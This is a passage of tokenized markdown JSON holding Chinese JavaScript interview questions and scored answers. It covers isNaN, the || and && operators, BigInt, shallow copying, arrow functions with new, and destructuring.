\\"undefined\\"，","text":"Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，","escaped":false}]}]},{"type":"list_item","raw":"- Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。\\n\\n","task":false,"loose":true,"text":"Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。\\n","tokens":[{"type":"text","raw":"Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。\\n","text":"Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。","tokens":[{"type":"text","raw":"Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。","text":"Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。","escaped":false}]}]},{"type":"list_item","raw":"- Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。\\n\\n","task":false,"loose":true,"text":"Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。\\n","tokens":[{"type":"text","raw":"Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。\\n","text":"Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。","tokens":[{"type":"text","raw":"Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。","text":"Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。","escaped":false}]}]},{"type":"list_item","raw":"- Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。\\n\\n","task":false,"loose":true,"text":"Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。\\n","tokens":[{"type":"text","raw":"Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。\\n","text":"Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。","tokens":[{"type":"text","raw":"Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。","text":"Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。","escaped":false}]}]},{"type":"list_item","raw":"- 对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","task":false,"loose":true,"text":"对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","tokens":[{"type":"text","raw":"对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","text":"对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","tokens":[{"type":"text","raw":"对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","text":"对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 62. isNaN 和 Number.isNaN 函数的区别？\\n\\n","depth":2,"text":"62. isNaN 和 Number.isNaN 函数的区别？","tokens":[{"type":"text","raw":"62. isNaN 和 Number.isNaN 函数的区别？","text":"62. isNaN 和 Number.isNaN 函数的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。\\n\\n- 函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。\\n\\n","task":false,"loose":true,"text":"函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。\\n","tokens":[{"type":"text","raw":"函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。\\n","text":"函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。","tokens":[{"type":"text","raw":"函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。","text":"函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。","escaped":false}]}]},{"type":"list_item","raw":"- 函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","task":false,"loose":true,"text":"函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","tokens":[{"type":"text","raw":"函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","text":"函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","tokens":[{"type":"text","raw":"函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","text":"函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，不会进行数据类型的转换，这种方法对于 NaN 的判断更为准确。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 63.  || 和 && 操作符的返回值？\\n\\n","depth":2,"text":"63.  || 和 && 操作符的返回值？","tokens":[{"type":"text","raw":"63.  || 和 && 操作符的返回值？","text":"63.  || 和 && 操作符的返回值？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- || 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。\\n\\n- 对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。\\n\\n- && 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。\\n\\n- || 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- || 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。\\n\\n","task":false,"loose":true,"text":"|| 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。\\n","tokens":[{"type":"text","raw":"|| 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。\\n","text":"|| 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。","tokens":[{"type":"text","raw":"|| 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。","text":"|| 和 && 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。","escaped":false}]}]},{"type":"list_item","raw":"- 对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。\\n\\n","task":false,"loose":true,"text":"对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。\\n","tokens":[{"type":"text","raw":"对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。\\n","text":"对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。","tokens":[{"type":"text","raw":"对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。","text":"对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。","escaped":false}]}]},{"type":"list_item","raw":"- && 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。\\n\\n","task":false,"loose":true,"text":"&& 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。\\n","tokens":[{"type":"text","raw":"&& 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。\\n","text":"&& 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。","tokens":[{"type":"text","raw":"&& 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。","text":"&& 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。","escaped":false}]}]},{"type":"list_item","raw":"- || 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","task":false,"loose":true,"text":"|| 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","tokens":[{"type":"text","raw":"|| 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","text":"|| 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","tokens":[{"type":"text","raw":"|| 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","text":"|| 和 && 返回它们其中一个操作数的值，而非条件判断的结果。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 64. 为什么会有BigInt的提案？\\n\\n","depth":2,"text":"64. 为什么会有BigInt的提案？","tokens":[{"type":"text","raw":"64. 为什么会有BigInt的提案？","text":"64. 为什么会有BigInt的提案？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","task":false,"loose":false,"text":"JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","tokens":[{"type":"text","raw":"JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","text":"JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","tokens":[{"type":"text","raw":"JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","text":"JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 65. object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别？\\n\\n","depth":2,"text":"65. object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别？","tokens":[{"type":"text","raw":"65. object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别？","text":"65. object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 两者都是浅拷贝。\\n\\n- Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。\\n\\n- 扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 两者都是浅拷贝。\\n\\n","task":false,"loose":true,"text":"两者都是浅拷贝。\\n","tokens":[{"type":"text","raw":"两者都是浅拷贝。\\n","text":"两者都是浅拷贝。","tokens":[{"type":"text","raw":"两者都是浅拷贝。","text":"两者都是浅拷贝。","escaped":false}]}]},{"type":"list_item","raw":"- Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。\\n\\n","task":false,"loose":true,"text":"Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。\\n","tokens":[{"type":"text","raw":"Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。\\n","text":"Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。","tokens":[{"type":"text","raw":"Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。","text":"Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。","escaped":false}]}]},{"type":"list_item","raw":"- 扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","task":false,"loose":true,"text":"扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","tokens":[{"type":"text","raw":"扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","text":"扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","tokens":[{"type":"text","raw":"扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","text":"扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 66. 如果new一个箭头函数的会怎么样?\\n\\n","depth":2,"text":"66. 如果new一个箭头函数的会怎么样?","tokens":[{"type":"text","raw":"66. 如果new一个箭头函数的会怎么样?","text":"66. 如果new一个箭头函数的会怎么样?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。\\n\\n- new操作符的实现步骤如下：\\n\\n- 1.创建一个对象\\n\\n- 2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）\\n\\n- 3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）\\n\\n- 4.返回新的对象\\n\\n- 由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。\\n\\n","task":false,"loose":true,"text":"箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。\\n","tokens":[{"type":"text","raw":"箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。\\n","text":"箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。","tokens":[{"type":"text","raw":"箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。","text":"箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。","escaped":false}]}]},{"type":"list_item","raw":"- new操作符的实现步骤如下：\\n\\n","task":false,"loose":true,"text":"new操作符的实现步骤如下：\\n","tokens":[{"type":"text","raw":"new操作符的实现步骤如下：\\n","text":"new操作符的实现步骤如下：","tokens":[{"type":"text","raw":"new操作符的实现步骤如下：","text":"new操作符的实现步骤如下：","escaped":false}]}]},{"type":"list_item","raw":"- 1.创建一个对象\\n\\n","task":false,"loose":true,"text":"1.创建一个对象\\n","tokens":[{"type":"text","raw":"1.创建一个对象\\n","text":"1.创建一个对象","tokens":[{"type":"text","raw":"1.创建一个对象","text":"1.创建一个对象","escaped":false}]}]},{"type":"list_item","raw":"- 2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）\\n\\n","task":false,"loose":true,"text":"2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）\\n","tokens":[{"type":"text","raw":"2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）\\n","text":"2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）","tokens":[{"type":"text","raw":"2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）","text":"2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）","escaped":false}]}]},{"type":"list_item","raw":"- 3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）\\n\\n","task":false,"loose":true,"text":"3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）\\n","tokens":[{"type":"text","raw":"3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）\\n","text":"3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）","tokens":[{"type":"text","raw":"3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）","text":"3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）","escaped":false}]}]},{"type":"list_item","raw":"- 4.返回新的对象\\n\\n","task":false,"loose":true,"text":"4.返回新的对象\\n","tokens":[{"type":"text","raw":"4.返回新的对象\\n","text":"4.返回新的对象","tokens":[{"type":"text","raw":"4.返回新的对象","text":"4.返回新的对象","escaped":false}]}]},{"type":"list_item","raw":"- 由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","task":false,"loose":true,"text":"由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","tokens":[{"type":"text","raw":"由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","text":"由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","tokens":[{"type":"text","raw":"由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","text":"由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 67. 对对象与数组的解构的理解\\n\\n","depth":2,"text":"67. 对对象与数组的解构的理解","tokens":[{"type":"text","raw":"67. 对对象与数组的解构的理解","text":"67. 对对象与数组的解构的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。\\n\\n- 数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的\\n\\n- 对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。\\n\\n","task":false,"loose":true,"text":"解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。\\n","tokens":[{"type":"text","raw":"解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。\\n","text":"解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。","tokens":[{"type":"text","raw":"解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。","text":"解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。","escaped":false}]}]},{"type":"list_item","raw":"- 数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的\\n\\n","task":false,"loose":true,"text":"数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的\\n","tokens":[{"type":"text","raw":"数组的解构 